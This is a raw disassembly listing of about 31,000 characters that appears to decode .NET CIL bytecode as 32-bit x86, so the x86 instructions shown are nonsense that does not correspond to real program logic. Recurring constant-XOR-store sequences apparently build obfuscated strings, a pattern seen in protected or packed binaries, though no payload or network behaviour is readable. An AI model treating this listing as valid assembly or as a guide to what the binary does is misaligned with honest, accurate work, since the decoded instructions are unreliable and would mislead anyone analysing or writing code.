  40315d:	00 00                	add    %al,(%eax)
  40315f:	00 54 fe 09          	add    %dl,0x9(%esi,%edi,8)
  403163:	02 00                	add    (%eax),%al
  403165:	20 10                	and    %dl,(%eax)
  403167:	00 00                	add    %al,(%eax)
  403169:	00 54 2a 13          	add    %dl,0x13(%edx,%ebp,1)
  40316d:	30 03                	xor    %al,(%ebx)
  40316f:	00 14 00             	add    %dl,(%eax,%eax,1)
  403172:	00 00                	add    %al,(%eax)
  403174:	00 00                	add    %al,(%eax)
  403176:	00 00                	add    %al,(%eax)
  403178:	fe 09                	decb   (%ecx)
  40317a:	09 00                	or     %eax,(%eax)
  40317c:	71 04                	jno    0x403182
  40317e:	00 00                	add    %al,(%eax)
  403180:	01 fe                	add    %edi,%esi
  403182:	09 01                	or     %eax,(%ecx)
  403184:	00 20                	add    %ah,(%eax)
  403186:	05 00 00 00 54       	add    $0x54000000,%eax
  40318b:	2a 13                	sub    (%ebx),%dl
  40318d:	30 02                	xor    %al,(%edx)
  40318f:	00 0b                	add    %cl,(%ebx)
  403191:	00 00                	add    %al,(%eax)
  403193:	00 00                	add    %al,(%eax)
  403195:	00 00                	add    %al,(%eax)
  403197:	00 fe                	add    %bh,%dh
  403199:	09 01                	or     %eax,(%ecx)
  40319b:	00 20                	add    %ah,(%eax)
  40319d:	00 00                	add    %al,(%eax)
  40319f:	00 00                	add    %al,(%eax)
  4031a1:	54                   	push   %esp
  4031a2:	2a 00                	sub    (%eax),%al
  4031a4:	13 30                	adc    (%eax),%esi
  4031a6:	02 00                	add    (%eax),%al
  4031a8:	16                   	push   %ss
	...
  4031b1:	fe 09                	decb   (%ecx)
  4031b3:	01 00                	add    %eax,(%eax)
  4031b5:	20 12                	and    %dl,(%edx)
  4031b7:	00 00                	add    %al,(%eax)
  4031b9:	00 54 fe 09          	add    %dl,0x9(%esi,%edi,8)
  4031bd:	02 00                	add    (%eax),%al
  4031bf:	20 10                	and    %dl,(%eax)
  4031c1:	00 00                	add    %al,(%eax)
  4031c3:	00 54 2a 00          	add    %dl,0x0(%edx,%ebp,1)
  4031c7:	00 13                	add    %dl,(%ebx)
  4031c9:	30 02                	xor    %al,(%edx)
  4031cb:	00 15 00 00 00 00    	add    %dl,0x0
  4031d1:	00 00                	add    %al,(%eax)
  4031d3:	00 fe                	add    %bh,%dh
  4031d5:	09 03                	or     %eax,(%ebx)
  4031d7:	00 28                	add    %ch,(%eax)
  4031d9:	07                   	pop    %es
  4031da:	00 00                	add    %al,(%eax)
  4031dc:	0a 00                	or     (%eax),%al
  4031de:	fe 09                	decb   (%ecx)
  4031e0:	01 00                	add    %eax,(%eax)
  4031e2:	20 00                	and    %al,(%eax)
  4031e4:	00 00                	add    %al,(%eax)
  4031e6:	00 54 2a 00          	add    %dl,0x0(%edx,%ebp,1)
  4031ea:	00 00                	add    %al,(%eax)
  4031ec:	13 30                	adc    (%eax),%esi
  4031ee:	07                   	pop    %es
  4031ef:	00 1c 05 00 00 0b 00 	add    %bl,0xb0000(,%eax,1)
  4031f6:	00 11                	add    %dl,(%ecx)
  4031f8:	00 28                	add    %ch,(%eax)
  4031fa:	08 00                	or     %al,(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	fe 0e                	decb   (%esi)
  403200:	00 00                	add    %al,(%eax)
  403202:	fe 09                	decb   (%ecx)
  403204:	04 00                	add    $0x0,%al
  403206:	fe 0c 00             	decb   (%eax,%eax,1)
  403209:	00 81 07 00 00 01    	add    %al,0x1000007(%ecx)
  40320f:	fe 09                	decb   (%ecx)
  403211:	04 00                	add    $0x0,%al
  403213:	71 07                	jno    0x40321c
  403215:	00 00                	add    %al,(%eax)
  403217:	01 20                	add    %esp,(%eax)
  403219:	0a 00                	or     (%eax),%al
  40321b:	00 00                	add    %al,(%eax)
  40321d:	8d 06                	lea    (%esi),%eax
  40321f:	00 00                	add    %al,(%eax)
  403221:	01 25 fe 0e 01 00    	add    %esp,0x10efe
  403227:	fe 09                	decb   (%ecx)
  403229:	05 00 fe 0c 01       	add    $0x10cfe00,%eax
  40322e:	00 81 03 00 00 01    	add    %al,0x1000003(%ecx)
  403234:	fe 09                	decb   (%ecx)
  403236:	05 00 71 03 00       	add    $0x37100,%eax
  40323b:	00 01                	add    %al,(%ecx)
  40323d:	20 00                	and    %al,(%eax)
  40323f:	00 00                	add    %al,(%eax)
  403241:	00 20                	add    %ah,(%eax)
  403243:	8e 00                	mov    (%eax),%es
  403245:	00 00                	add    %al,(%eax)
  403247:	20 e3                	and    %ah,%bl
  403249:	00 00                	add    %al,(%eax)
  40324b:	00 61 9d             	add    %ah,-0x63(%ecx)
  40324e:	fe 09                	decb   (%ecx)
  403250:	05 00 71 03 00       	add    $0x37100,%eax
  403255:	00 01                	add    %al,(%ecx)
  403257:	20 01                	and    %al,(%ecx)
  403259:	00 00                	add    %al,(%eax)
  40325b:	00 7f 08             	add    %bh,0x8(%edi)
  40325e:	00 00                	add    %al,(%eax)
  403260:	04 d3                	add    $0xd3,%al
  403262:	20 01                	and    %al,(%ecx)
  403264:	00 00                	add    %al,(%eax)
  403266:	00 58 47             	add    %bl,0x47(%eax)
  403269:	69 20 c9 00 00 00    	imul   $0xc9,(%eax),%esp
  40326f:	61                   	popa
  403270:	9d                   	popf
  403271:	fe 09                	decb   (%ecx)
  403273:	05 00 71 03 00       	add    $0x37100,%eax
  403278:	00 01                	add    %al,(%ecx)
  40327a:	20 02                	and    %al,(%edx)
  40327c:	00 00                	add    %al,(%eax)
  40327e:	00 7f 08             	add    %bh,0x8(%edi)
  403281:	00 00                	add    %al,(%eax)
  403283:	04 d3                	add    $0xd3,%al
  403285:	20 02                	and    %al,(%edx)
  403287:	00 00                	add    %al,(%eax)
  403289:	00 58 47             	add    %bl,0x47(%eax)
  40328c:	69 20 48 00 00 00    	imul   $0x48,(%eax),%esp
  403292:	61                   	popa
  403293:	9d                   	popf
  403294:	fe 09                	decb   (%ecx)
  403296:	05 00 71 03 00       	add    $0x37100,%eax
  40329b:	00 01                	add    %al,(%ecx)
  40329d:	20 03                	and    %al,(%ebx)
  40329f:	00 00                	add    %al,(%eax)
  4032a1:	00 7f 08             	add    %bh,0x8(%edi)
  4032a4:	00 00                	add    %al,(%eax)
  4032a6:	04 d3                	add    $0xd3,%al
  4032a8:	20 03                	and    %al,(%ebx)
  4032aa:	00 00                	add    %al,(%eax)
  4032ac:	00 58 47             	add    %bl,0x47(%eax)
  4032af:	69 20 1b 00 00 00    	imul   $0x1b,(%eax),%esp
  4032b5:	61                   	popa
  4032b6:	9d                   	popf
  4032b7:	fe 09                	decb   (%ecx)
  4032b9:	05 00 71 03 00       	add    $0x37100,%eax
  4032be:	00 01                	add    %al,(%ecx)
  4032c0:	20 04 00             	and    %al,(%eax,%eax,1)
  4032c3:	00 00                	add    %al,(%eax)
  4032c5:	7f 08                	jg     0x4032cf
  4032c7:	00 00                	add    %al,(%eax)
  4032c9:	04 d3                	add    $0xd3,%al
  4032cb:	20 04 00             	and    %al,(%eax,%eax,1)
  4032ce:	00 00                	add    %al,(%eax)
  4032d0:	58                   	pop    %eax
  4032d1:	47                   	inc    %edi
  4032d2:	69 20 fd 00 00 00    	imul   $0xfd,(%eax),%esp
  4032d8:	61                   	popa
  4032d9:	9d                   	popf
  4032da:	fe 09                	decb   (%ecx)
  4032dc:	05 00 71 03 00       	add    $0x37100,%eax
  4032e1:	00 01                	add    %al,(%ecx)
  4032e3:	20 05 00 00 00 7f    	and    %al,0x7f000000
  4032e9:	08 00                	or     %al,(%eax)
  4032eb:	00 04 d3             	add    %al,(%ebx,%edx,8)
  4032ee:	20 05 00 00 00 58    	and    %al,0x58000000
  4032f4:	47                   	inc    %edi
  4032f5:	69 20 8d 00 00 00    	imul   $0x8d,(%eax),%esp
  4032fb:	61                   	popa
  4032fc:	9d                   	popf
  4032fd:	fe 09                	decb   (%ecx)
  4032ff:	05 00 71 03 00       	add    $0x37100,%eax
  403304:	00 01                	add    %al,(%ecx)
  403306:	20 06                	and    %al,(%esi)
  403308:	00 00                	add    %al,(%eax)
  40330a:	00 20                	add    %ah,(%eax)
  40330c:	39 00                	cmp    %eax,(%eax)
  40330e:	00 00                	add    %al,(%eax)
  403310:	20 17                	and    %dl,(%edi)
  403312:	00 00                	add    %al,(%eax)
  403314:	00 61 9d             	add    %ah,-0x63(%ecx)
  403317:	fe 09                	decb   (%ecx)
  403319:	05 00 71 03 00       	add    $0x37100,%eax
  40331e:	00 01                	add    %al,(%ecx)
  403320:	20 07                	and    %al,(%edi)
  403322:	00 00                	add    %al,(%eax)
  403324:	00 20                	add    %ah,(%eax)
  403326:	cb                   	lret
  403327:	00 00                	add    %al,(%eax)
  403329:	00 20                	add    %ah,(%eax)
  40332b:	b9 00 00 00 61       	mov    $0x61000000,%ecx
  403330:	9d                   	popf
  403331:	fe 09                	decb   (%ecx)
  403333:	05 00 71 03 00       	add    $0x37100,%eax
  403338:	00 01                	add    %al,(%ecx)
  40333a:	20 08                	and    %cl,(%eax)
  40333c:	00 00                	add    %al,(%eax)
  40333e:	00 20                	add    %ah,(%eax)
  403340:	8e 00                	mov    (%eax),%es
  403342:	00 00                	add    %al,(%eax)
  403344:	20 ef                	and    %ch,%bh
  403346:	00 00                	add    %al,(%eax)
  403348:	00 61 9d             	add    %ah,-0x63(%ecx)
  40334b:	fe 09                	decb   (%ecx)
  40334d:	05 00 71 03 00       	add    $0x37100,%eax
  403352:	00 01                	add    %al,(%ecx)
  403354:	20 09                	and    %cl,(%ecx)
  403356:	00 00                	add    %al,(%eax)
  403358:	00 20                	add    %ah,(%eax)
  40335a:	8d 00                	lea    (%eax),%eax
  40335c:	00 00                	add    %al,(%eax)
  40335e:	20 ff                	and    %bh,%bh
  403360:	00 00                	add    %al,(%eax)
  403362:	00 61 9d             	add    %ah,-0x63(%ecx)
  403365:	73 03                	jae    0x40336a
  403367:	00 00                	add    %al,(%eax)
  403369:	0a 28                	or     (%eax),%ch
  40336b:	09 00                	or     %eax,(%eax)
  40336d:	00 0a                	add    %cl,(%edx)
  40336f:	fe 0e                	decb   (%esi)
  403371:	02 00                	add    (%eax),%al
  403373:	fe 09                	decb   (%ecx)
  403375:	06                   	push   %es
  403376:	00 fe                	add    %bh,%dh
  403378:	0c 02                	or     $0x2,%al
  40337a:	00 81 07 00 00 01    	add    %al,0x1000007(%ecx)
  403380:	fe 09                	decb   (%ecx)
  403382:	04 00                	add    $0x0,%al
  403384:	71 07                	jno    0x40338d
  403386:	00 00                	add    %al,(%eax)
  403388:	01 20                	add    %esp,(%eax)
  40338a:	06                   	push   %es
  40338b:	00 00                	add    %al,(%eax)
  40338d:	00 8d 06 00 00 01    	add    %cl,0x1000006(%ebp)
  403393:	25 fe 0e 01 00       	and    $0x10efe,%eax
  403398:	fe 09                	decb   (%ecx)
  40339a:	05 00 fe 0c 01       	add    $0x10cfe00,%eax
  40339f:	00 81 03 00 00 01    	add    %al,0x1000003(%ecx)
  4033a5:	fe 09                	decb   (%ecx)
  4033a7:	05 00 71 03 00       	add    $0x37100,%eax
  4033ac:	00 01                	add    %al,(%ecx)
  4033ae:	20 00                	and    %al,(%eax)
  4033b0:	00 00                	add    %al,(%eax)
  4033b2:	00 20                	add    %ah,(%eax)
  4033b4:	50                   	push   %eax
  4033b5:	00 00                	add    %al,(%eax)
  4033b7:	00 20                	add    %ah,(%eax)
  4033b9:	07                   	pop    %es
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	00 61 9d             	add    %ah,-0x63(%ecx)
  4033bf:	fe 09                	decb   (%ecx)
  4033c1:	05 00 71 03 00       	add    $0x37100,%eax
  4033c6:	00 01                	add    %al,(%ecx)
  4033c8:	20 01                	and    %al,(%ecx)
  4033ca:	00 00                	add    %al,(%eax)
  4033cc:	00 7f 09             	add    %bh,0x9(%edi)
  4033cf:	00 00                	add    %al,(%eax)
  4033d1:	04 d3                	add    $0xd3,%al
  4033d3:	20 01                	and    %al,(%ecx)
  4033d5:	00 00                	add    %al,(%eax)
  4033d7:	00 58 47             	add    %bl,0x47(%eax)
  4033da:	69 20 9a 00 00 00    	imul   $0x9a,(%eax),%esp
  4033e0:	61                   	popa
  4033e1:	9d                   	popf
  4033e2:	fe 09                	decb   (%ecx)
  4033e4:	05 00 71 03 00       	add    $0x37100,%eax
  4033e9:	00 01                	add    %al,(%ecx)
  4033eb:	20 02                	and    %al,(%edx)
  4033ed:	00 00                	add    %al,(%eax)
  4033ef:	00 20                	add    %ah,(%eax)
  4033f1:	9b                   	fwait
  4033f2:	00 00                	add    %al,(%eax)
  4033f4:	00 20                	add    %ah,(%eax)
  4033f6:	f5                   	cmc
  4033f7:	00 00                	add    %al,(%eax)
  4033f9:	00 61 9d             	add    %ah,-0x63(%ecx)
  4033fc:	fe 09                	decb   (%ecx)
  4033fe:	05 00 71 03 00       	add    $0x37100,%eax
  403403:	00 01                	add    %al,(%ecx)
  403405:	20 03                	and    %al,(%ebx)
  403407:	00 00                	add    %al,(%eax)
  403409:	00 20                	add    %ah,(%eax)
  40340b:	6a 00                	push   $0x0
  40340d:	00 00                	add    %al,(%eax)
  40340f:	20 38                	and    %bh,(%eax)
  403411:	00 00                	add    %al,(%eax)
  403413:	00 61 9d             	add    %ah,-0x63(%ecx)
  403416:	fe 09                	decb   (%ecx)
  403418:	05 00 71 03 00       	add    $0x37100,%eax
  40341d:	00 01                	add    %al,(%ecx)
  40341f:	20 04 00             	and    %al,(%eax,%eax,1)
  403422:	00 00                	add    %al,(%eax)
  403424:	20 ff                	and    %bh,%bh
  403426:	00 00                	add    %al,(%eax)
  403428:	00 20                	add    %ah,(%eax)
  40342a:	be 00 00 00 61       	mov    $0x61000000,%esi
  40342f:	9d                   	popf
  403430:	fe 09                	decb   (%ecx)
  403432:	05 00 71 03 00       	add    $0x37100,%eax
  403437:	00 01                	add    %al,(%ecx)
  403439:	20 05 00 00 00 20    	and    %al,0x20000000
  40343f:	24 00                	and    $0x0,%al
  403441:	00 00                	add    %al,(%eax)
  403443:	20 76 00             	and    %dh,0x0(%esi)
  403446:	00 00                	add    %al,(%eax)
  403448:	61                   	popa
  403449:	9d                   	popf
  40344a:	73 03                	jae    0x40344f
  40344c:	00 00                	add    %al,(%eax)
  40344e:	0a 20                	or     (%eax),%ah
  403450:	0a 00                	or     (%eax),%al
  403452:	00 00                	add    %al,(%eax)
  403454:	8d 06                	lea    (%esi),%eax
  403456:	00 00                	add    %al,(%eax)
  403458:	01 25 fe 0e 01 00    	add    %esp,0x10efe
  40345e:	fe 09                	decb   (%ecx)
  403460:	05 00 fe 0c 01       	add    $0x10cfe00,%eax
  403465:	00 81 03 00 00 01    	add    %al,0x1000003(%ecx)
  40346b:	fe 09                	decb   (%ecx)
  40346d:	05 00 71 03 00       	add    $0x37100,%eax
  403472:	00 01                	add    %al,(%ecx)
  403474:	20 00                	and    %al,(%eax)
  403476:	00 00                	add    %al,(%eax)
  403478:	00 20                	add    %ah,(%eax)
  40347a:	ea 00 00 00 20 bd 00 	ljmp   $0xbd,$0x20000000
  403481:	00 00                	add    %al,(%eax)
  403483:	61                   	popa
  403484:	9d                   	popf
  403485:	fe 09                	decb   (%ecx)
  403487:	05 00 71 03 00       	add    $0x37100,%eax
  40348c:	00 01                	add    %al,(%ecx)
  40348e:	20 01                	and    %al,(%ecx)
  403490:	00 00                	add    %al,(%eax)
  403492:	00 20                	add    %ah,(%eax)
  403494:	39 00                	cmp    %eax,(%eax)
  403496:	00 00                	add    %al,(%eax)
  403498:	20 50 00             	and    %dl,0x0(%eax)
  40349b:	00 00                	add    %al,(%eax)
  40349d:	61                   	popa
  40349e:	9d                   	popf
  40349f:	fe 09                	decb   (%ecx)
  4034a1:	05 00 71 03 00       	add    $0x37100,%eax
  4034a6:	00 01                	add    %al,(%ecx)
  4034a8:	20 02                	and    %al,(%edx)
  4034aa:	00 00                	add    %al,(%eax)
  4034ac:	00 7f 0a             	add    %bh,0xa(%edi)
  4034af:	00 00                	add    %al,(%eax)
  4034b1:	04 d3                	add    $0xd3,%al
  4034b3:	20 02                	and    %al,(%edx)
  4034b5:	00 00                	add    %al,(%eax)
  4034b7:	00 58 47             	add    %bl,0x47(%eax)
  4034ba:	69 20 6c 00 00 00    	imul   $0x6c,(%eax),%esp
  4034c0:	61                   	popa
  4034c1:	9d                   	popf
  4034c2:	fe 09                	decb   (%ecx)
  4034c4:	05 00 71 03 00       	add    $0x37100,%eax
  4034c9:	00 01                	add    %al,(%ecx)
  4034cb:	20 03                	and    %al,(%ebx)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	00 20                	add    %ah,(%eax)
  4034d1:	84 00                	test   %al,(%eax)
  4034d3:	00 00                	add    %al,(%eax)
  4034d5:	20 d6                	and    %dl,%dh
  4034d7:	00 00                	add    %al,(%eax)
  4034d9:	00 61 9d             	add    %ah,-0x63(%ecx)
  4034dc:	fe 09                	decb   (%ecx)
  4034de:	05 00 71 03 00       	add    $0x37100,%eax
  4034e3:	00 01                	add    %al,(%ecx)
  4034e5:	20 04 00             	and    %al,(%eax,%eax,1)
  4034e8:	00 00                	add    %al,(%eax)
  4034ea:	7f 0a                	jg     0x4034f6
  4034ec:	00 00                	add    %al,(%eax)
  4034ee:	04 d3                	add    $0xd3,%al
  4034f0:	20 04 00             	and    %al,(%eax,%eax,1)
  4034f3:	00 00                	add    %al,(%eax)
  4034f5:	58                   	pop    %eax
  4034f6:	47                   	inc    %edi
  4034f7:	69 20 1c 00 00 00    	imul   $0x1c,(%eax),%esp
  4034fd:	61                   	popa
  4034fe:	9d                   	popf
  4034ff:	fe 09                	decb   (%ecx)
  403501:	05 00 71 03 00       	add    $0x37100,%eax
  403506:	00 01                	add    %al,(%ecx)
  403508:	20 05 00 00 00 7f    	and    %al,0x7f000000
  40350e:	0a 00                	or     (%eax),%al
  403510:	00 04 d3             	add    %al,(%ebx,%edx,8)
  403513:	20 05 00 00 00 58    	and    %al,0x58000000
  403519:	47                   	inc    %edi
  40351a:	69 20 08 00 00 00    	imul   $0x8,(%eax),%esp
  403520:	61                   	popa
  403521:	9d                   	popf
  403522:	fe 09                	decb   (%ecx)
  403524:	05 00 71 03 00       	add    $0x37100,%eax
  403529:	00 01                	add    %al,(%ecx)
  40352b:	20 06                	and    %al,(%esi)
  40352d:	00 00                	add    %al,(%eax)
  40352f:	00 7f 0a             	add    %bh,0xa(%edi)
  403532:	00 00                	add    %al,(%eax)
  403534:	04 d3                	add    $0xd3,%al
  403536:	20 06                	and    %al,(%esi)
  403538:	00 00                	add    %al,(%eax)
  40353a:	00 58 47             	add    %bl,0x47(%eax)
  40353d:	69 20 e5 00 00 00    	imul   $0xe5,(%eax),%esp
  403543:	61                   	popa
  403544:	9d                   	popf
  403545:	fe 09                	decb   (%ecx)
  403547:	05 00 71 03 00       	add    $0x37100,%eax
  40354c:	00 01                	add    %al,(%ecx)
  40354e:	20 07                	and    %al,(%edi)
  403550:	00 00                	add    %al,(%eax)
  403552:	00 20                	add    %ah,(%eax)
  403554:	e2 00                	loop   0x403556
  403556:	00 00                	add    %al,(%eax)
  403558:	20 87 00 00 00 61    	and    %al,0x61000000(%edi)
  40355e:	9d                   	popf
  40355f:	fe 09                	decb   (%ecx)
  403561:	05 00 71 03 00       	add    $0x37100,%eax
  403566:	00 01                	add    %al,(%ecx)
  403568:	20 08                	and    %cl,(%eax)
  40356a:	00 00                	add    %al,(%eax)
  40356c:	00 20                	add    %ah,(%eax)
  40356e:	35 00 00 00 20       	xor    $0x20000000,%eax
  403573:	4d                   	dec    %ebp
  403574:	00 00                	add    %al,(%eax)
  403576:	00 61 9d             	add    %ah,-0x63(%ecx)
  403579:	fe 09                	decb   (%ecx)
  40357b:	05 00 71 03 00       	add    $0x37100,%eax
  403580:	00 01                	add    %al,(%ecx)
  403582:	20 09                	and    %cl,(%ecx)
  403584:	00 00                	add    %al,(%eax)
  403586:	00 7f 0a             	add    %bh,0xa(%edi)
  403589:	00 00                	add    %al,(%eax)
  40358b:	04 d3                	add    $0xd3,%al
  40358d:	20 09                	and    %cl,(%ecx)
  40358f:	00 00                	add    %al,(%eax)
  403591:	00 58 47             	add    %bl,0x47(%eax)
  403594:	69 20 00 00 00 00    	imul   $0x0,(%eax),%esp
  40359a:	61                   	popa
  40359b:	9d                   	popf
  40359c:	73 03                	jae    0x4035a1
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	0a 28                	or     (%eax),%ch
  4035a2:	0a 00                	or     (%eax),%al
  4035a4:	00 0a                	add    %cl,(%edx)
  4035a6:	fe 0e                	decb   (%esi)
  4035a8:	03 00                	add    (%eax),%eax
  4035aa:	fe 09                	decb   (%ecx)
  4035ac:	07                   	pop    %es
  4035ad:	00 fe                	add    %bh,%dh
  4035af:	0c 03                	or     $0x3,%al
  4035b1:	00 81 07 00 00 01    	add    %al,0x1000007(%ecx)
  4035b7:	fe 09                	decb   (%ecx)
  4035b9:	04 00                	add    $0x0,%al
  4035bb:	71 07                	jno    0x4035c4
  4035bd:	00 00                	add    %al,(%eax)
  4035bf:	01 20                	add    %esp,(%eax)
  4035c1:	09 00                	or     %eax,(%eax)
  4035c3:	00 00                	add    %al,(%eax)
  4035c5:	8d 06                	lea    (%esi),%eax
  4035c7:	00 00                	add    %al,(%eax)
  4035c9:	01 25 fe 0e 01 00    	add    %esp,0x10efe
  4035cf:	fe 09                	decb   (%ecx)
  4035d1:	05 00 fe 0c 01       	add    $0x10cfe00,%eax
  4035d6:	00 81 03 00 00 01    	add    %al,0x1000003(%ecx)
  4035dc:	fe 09                	decb   (%ecx)
  4035de:	05 00 71 03 00       	add    $0x37100,%eax
  4035e3:	00 01                	add    %al,(%ecx)
  4035e5:	20 00                	and    %al,(%eax)
  4035e7:	00 00                	add    %al,(%eax)
  4035e9:	00 7f 0b             	add    %bh,0xb(%edi)
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	04 d3                	add    $0xd3,%al
  4035f0:	20 00                	and    %al,(%eax)
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	00 58 47             	add    %bl,0x47(%eax)
  4035f7:	69 20 3b 00 00 00    	imul   $0x3b,(%eax),%esp
  4035fd:	61                   	popa
  4035fe:	9d                   	popf
  4035ff:	fe 09                	decb   (%ecx)
  403601:	05 00 71 03 00       	add    $0x37100,%eax
  403606:	00 01                	add    %al,(%ecx)
  403608:	20 01                	and    %al,(%ecx)
  40360a:	00 00                	add    %al,(%eax)
  40360c:	00 7f 0b             	add    %bh,0xb(%edi)
  40360f:	00 00                	add    %al,(%eax)
  403611:	04 d3                	add    $0xd3,%al
  403613:	20 01                	and    %al,(%ecx)
  403615:	00 00                	add    %al,(%eax)
  403617:	00 58 47             	add    %bl,0x47(%eax)
  40361a:	69 20 d6 00 00 00    	imul   $0xd6,(%eax),%esp
  403620:	61                   	popa
  403621:	9d                   	popf
  403622:	fe 09                	decb   (%ecx)
  403624:	05 00 71 03 00       	add    $0x37100,%eax
  403629:	00 01                	add    %al,(%ecx)
  40362b:	20 02                	and    %al,(%edx)
  40362d:	00 00                	add    %al,(%eax)
  40362f:	00 20                	add    %ah,(%eax)
  403631:	cd 00                	int    $0x0
  403633:	00 00                	add    %al,(%eax)
  403635:	20 b9 00 00 00 61    	and    %bh,0x61000000(%ecx)
  40363b:	9d                   	popf
  40363c:	fe 09                	decb   (%ecx)
  40363e:	05 00 71 03 00       	add    $0x37100,%eax
  403643:	00 01                	add    %al,(%ecx)
  403645:	20 03                	and    %al,(%ebx)
  403647:	00 00                	add    %al,(%eax)
  403649:	00 20                	add    %ah,(%eax)
  40364b:	04 00                	add    $0x0,%al
  40364d:	00 00                	add    %al,(%eax)
  40364f:	20 76 00             	and    %dh,0x0(%esi)
  403652:	00 00                	add    %al,(%eax)
  403654:	61                   	popa
  403655:	9d                   	popf
  403656:	fe 09                	decb   (%ecx)
  403658:	05 00 71 03 00       	add    $0x37100,%eax
  40365d:	00 01                	add    %al,(%ecx)
  40365f:	20 04 00             	and    %al,(%eax,%eax,1)
  403662:	00 00                	add    %al,(%eax)
  403664:	20 4f 00             	and    %cl,0x0(%edi)
  403667:	00 00                	add    %al,(%eax)
  403669:	20 2e                	and    %ch,(%esi)
  40366b:	00 00                	add    %al,(%eax)
  40366d:	00 61 9d             	add    %ah,-0x63(%ecx)
  403670:	fe 09                	decb   (%ecx)
  403672:	05 00 71 03 00       	add    $0x37100,%eax
  403677:	00 01                	add    %al,(%ecx)
  403679:	20 05 00 00 00 7f    	and    %al,0x7f000000
  40367f:	0b 00                	or     (%eax),%eax
  403681:	00 04 d3             	add    %al,(%ebx,%edx,8)
  403684:	20 05 00 00 00 58    	and    %al,0x58000000
  40368a:	47                   	inc    %edi
  40368b:	69 20 bb 00 00 00    	imul   $0xbb,(%eax),%esp
  403691:	61                   	popa
  403692:	9d                   	popf
  403693:	fe 09                	decb   (%ecx)
  403695:	05 00 71 03 00       	add    $0x37100,%eax
  40369a:	00 01                	add    %al,(%ecx)
  40369c:	20 06                	and    %al,(%esi)
  40369e:	00 00                	add    %al,(%eax)
  4036a0:	00 20                	add    %ah,(%eax)
  4036a2:	f7 00 00 00 20 83    	testl  $0x83200000,(%eax)
  4036a8:	00 00                	add    %al,(%eax)
  4036aa:	00 61 9d             	add    %ah,-0x63(%ecx)
  4036ad:	fe 09                	decb   (%ecx)
  4036af:	05 00 71 03 00       	add    $0x37100,%eax
  4036b4:	00 01                	add    %al,(%ecx)
  4036b6:	20 07                	and    %al,(%edi)
  4036b8:	00 00                	add    %al,(%eax)
  4036ba:	00 20                	add    %ah,(%eax)
  4036bc:	57                   	push   %edi
  4036bd:	00 00                	add    %al,(%eax)
  4036bf:	00 20                	add    %ah,(%eax)
  4036c1:	32 00                	xor    (%eax),%al
  4036c3:	00 00                	add    %al,(%eax)
  4036c5:	61                   	popa
  4036c6:	9d                   	popf
  4036c7:	fe 09                	decb   (%ecx)
  4036c9:	05 00 71 03 00       	add    $0x37100,%eax
  4036ce:	00 01                	add    %al,(%ecx)
  4036d0:	20 08                	and    %cl,(%eax)
  4036d2:	00 00                	add    %al,(%eax)
  4036d4:	00 7f 0b             	add    %bh,0xb(%edi)
  4036d7:	00 00                	add    %al,(%eax)
  4036d9:	04 d3                	add    $0xd3,%al
  4036db:	20 08                	and    %cl,(%eax)
  4036dd:	00 00                	add    %al,(%eax)
  4036df:	00 58 47             	add    %bl,0x47(%eax)
  4036e2:	69 20 ce 00 00 00    	imul   $0xce,(%eax),%esp
  4036e8:	61                   	popa
  4036e9:	9d                   	popf
  4036ea:	73 03                	jae    0x4036ef
  4036ec:	00 00                	add    %al,(%eax)
  4036ee:	0a 28                	or     (%eax),%ch
  4036f0:	09 00                	or     %eax,(%eax)
  4036f2:	00 0a                	add    %cl,(%edx)
  4036f4:	fe 0e                	decb   (%esi)
  4036f6:	04 00                	add    $0x0,%al
  4036f8:	fe 09                	decb   (%ecx)
  4036fa:	08 00                	or     %al,(%eax)
  4036fc:	fe 0c 04             	decb   (%esp,%eax,1)
  4036ff:	00 81 07 00 00 01    	add    %al,0x1000007(%ecx)
  403705:	fe 09                	decb   (%ecx)
  403707:	00 00                	add    %al,(%eax)
  403709:	20 01                	and    %al,(%ecx)
  40370b:	00 00                	add    %al,(%eax)
  40370d:	00 54 fe 0c          	add    %dl,0xc(%esi,%edi,8)
  403711:	05 00 2a 13 30       	add    $0x30132a00,%eax
  403716:	05 00 1b 04 00       	add    $0x41b00,%eax
  40371b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40371e:	00 11                	add    %dl,(%ecx)
  403720:	20 20                	and    %ah,(%eax)
  403722:	00 00                	add    %al,(%eax)
  403724:	00 8d 06 00 00 01    	add    %cl,0x1000006(%ebp)
  40372a:	25 fe 0e 00 00       	and    $0xefe,%eax
  40372f:	fe 09                	decb   (%ecx)
  403731:	05 00 fe 0c 00       	add    $0xcfe00,%eax
  403736:	00 81 03 00 00 01    	add    %al,0x1000003(%ecx)
  40373c:	fe 09                	decb   (%ecx)
  40373e:	05 00 71 03 00       	add    $0x37100,%eax
  403743:	00 01                	add    %al,(%ecx)
  403745:	20 00                	and    %al,(%eax)
  403747:	00 00                	add    %al,(%eax)
  403749:	00 20                	add    %ah,(%eax)
  40374b:	ca 00 00             	lret   $0x0
  40374e:	00 20                	add    %ah,(%eax)
  403750:	9d                   	popf
  403751:	00 00                	add    %al,(%eax)
  403753:	00 61 9d             	add    %ah,-0x63(%ecx)
  403756:	fe 09                	decb   (%ecx)
  403758:	05 00 71 03 00       	add    $0x37100,%eax
  40375d:	00 01                	add    %al,(%ecx)
  40375f:	20 01                	and    %al,(%ecx)
  403761:	00 00                	add    %al,(%eax)
  403763:	00 7f 0d             	add    %bh,0xd(%edi)
  403766:	00 00                	add    %al,(%eax)
  403768:	04 d3                	add    $0xd3,%al
  40376a:	20 01                	and    %al,(%ecx)
  40376c:	00 00                	add    %al,(%eax)
  40376e:	00 58 47             	add    %bl,0x47(%eax)
  403771:	69 20 07 00 00 00    	imul   $0x7,(%eax),%esp
  403777:	61                   	popa
  403778:	9d                   	popf
  403779:	fe 09                	decb   (%ecx)
  40377b:	05 00 71 03 00       	add    $0x37100,%eax
  403780:	00 01                	add    %al,(%ecx)
  403782:	20 02                	and    %al,(%edx)
  403784:	00 00                	add    %al,(%eax)
  403786:	00 20                	add    %ah,(%eax)
  403788:	6a 00                	push   $0x0
  40378a:	00 00                	add    %al,(%eax)
  40378c:	20 04 00             	and    %al,(%eax,%eax,1)
  40378f:	00 00                	add    %al,(%eax)
  403791:	61                   	popa
  403792:	9d                   	popf
  403793:	fe 09                	decb   (%ecx)
  403795:	05 00 71 03 00       	add    $0x37100,%eax
  40379a:	00 01                	add    %al,(%ecx)
